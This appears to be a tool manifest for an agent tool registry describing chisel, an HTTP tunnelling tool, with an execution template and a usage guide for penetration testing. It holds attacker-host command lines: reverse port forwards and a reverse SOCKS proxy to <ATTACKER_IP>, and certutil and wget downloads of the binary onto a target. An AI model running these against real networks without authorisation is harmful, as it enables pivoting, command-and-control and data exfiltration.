---
id: security-tunnel-chisel
namespace: security:tunnel:chisel
name: chisel
description: Fast TCP/UDP tunnel over HTTP, used for network pivoting and port
  forwarding through restrictive firewalls using a single binary with no dependencies.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - network.tunnel.http
  - network.forward.port
  - network.forward.reverse
  - network.proxy.socks
  - security.pivot.traffic
platforms:
  - linux
  - macos
  - windows
risk_level: medium
trust_level: verified
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - socat
  - ssh
contract:
  inputs:
    - type: network.target.ip
      description: Chisel server IP
    - type: network.port
      description: Chisel server port
  outputs:
    - type: network.tunnel
      description: Encrypted tunnel over HTTP
  side_effects:
    - network_traffic
    - raw_socket_access
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
  - chisel
parameters:
  - name: mode
    type: string
    required: true
    description: "Mode: server or client"
  - name: port
    type: integer
    required: false
    default_value: 8080
    description: "Listening port"
  - name: reverse
    type: boolean
    required: false
    description: "Enable reverse tunneling"
  - name: socks
    type: boolean
    required: false
    description: "Enable SOCKS proxy"
  - name: remote
    type: string
    required: false
    description: "Remote forward specification (e.g., R:socks or R:port:host:port)"
global_vars:
  port: port
execution:
  template: "chisel server -p {port} --reverse"
  sandbox: execFile
  timeout_seconds: 86400
  shell: false
examples:
  - description: "Start chisel server in reverse mode on attacking machine"
    command: chisel server -p 8080 --reverse
  - description: "Connect client to server with reverse port forwarding"
    command: chisel client <ATTACKER_IP>:8080 R:8888:<INTERNAL_IP>:80
  - description: "Reverse SOCKS proxy (tunnel all traffic through target)"
    command: chisel client <ATTACKER_IP>:8080 R:socks
  - description: "Remote port forwarding (expose internal service on attacker port)"
    command: chisel client <ATTACKER_IP>:8080 R:8888:localhost:3389
references:
  - label: "Chisel GitHub"
    url: "https://github.com/jpillora/chisel"
techniques:
  - command-and-control
  - exfiltration
install:
    - method: go
      repo_url: "github.com/jpillora/chisel"
      commands:
        - "go install github.com/jpillora/chisel@latest"
    - method: brew
      package_name: "chisel"
      commands:
        - "brew install chisel"
---

# Chisel — Fast TCP Tunnel over HTTP

Chisel is a single-binary TCP/UDP tunnel that transports over HTTP, secured with SSH encryption. It's ideal for penetration testing scenarios where you need to pivot through restrictive firewalls.

## Modes

| Mode | Command | Use Case |
|------|---------|----------|
| Server | `chisel server -p PORT --reverse` | Listening relay on attacker machine |
| Client (reverse fwd) | `chisel client IP:PORT R:LPORT:RHOST:RPORT` | Expose internal service to attacker |
| Client (SOCKS) | `chisel client IP:PORT R:socks` | Full SOCKS proxy through tunnel |

## Deployment

The chisel binary is self-contained with no dependencies — simply upload it to the target via SMB, HTTP, or any file transfer method.

```bash
# Upload via certutil (Windows)
certutil -urlcache -f http://ATTACKER/chisel.exe chisel.exe

# Upload via wget (Linux)
wget http://ATTACKER:8000/chisel -O chisel
```
